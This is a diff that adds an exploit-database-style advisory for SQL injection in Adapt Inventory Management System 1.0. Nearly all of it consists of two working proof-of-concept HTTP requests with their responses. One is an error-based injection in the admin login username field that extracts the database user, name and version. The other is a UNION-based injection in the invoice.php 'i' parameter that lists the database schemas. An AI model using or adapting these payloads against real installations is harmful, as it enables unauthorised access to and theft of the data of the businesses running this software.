@@ -1,0 +1,67 @@
+# Exploit Title: Adapt Inventory Management System 1.0 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-10
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.adaptinventory.com/
+# Software Link: https://codecanyon.net/item/adapt-inventory-management-system/22838514
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1) 
+# http://localhost/[PATH]/admin/login.php
+# 
+
+POST /[PATH]/admin/login.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 280
+Cookie: PHPSESSID=e23redq9bp28kar813ggnk4g87
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+username=12'||(SeleCT%20'Efe'%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||'&password=%27: undefined
+HTTP/1.1 200 OK
+Date: Thu, 10 Jan 2019 18:14:53 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding,User-Agent
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: application/json
+Transfer-Encoding: chunked
+
+# POC: 
+# 2) 
+# http://localhost/[PATH]/admin/invoice.php?i=[SQL]
+# 
+
+GET /[PATH]/admin/invoice.php?i=-1%27%20UNION%20SELECT%200x30783331,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,(SELECT%20(@x)%20FROM%20(SELECT%20(@x:=0x00),(@NR_DB:=0),(SELECT%20(0)%20FROM%20(INFORMATION_SCHEMA.SCHEMATA)%20WHERE%20(@x)%20IN%20(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x),0x3131,0x3132,0x3133,0x3134,0x3135,0x3136,0x3137,0x3138,0x3139,0x3230,0x3231,0x3232,0x3233,0x3234,0x3235,0x3236,0x3237--%20- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=e23redq9bp28kar813ggnk4g87
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Thu, 10 Jan 2019 18:06:12 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding,User-Agent
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
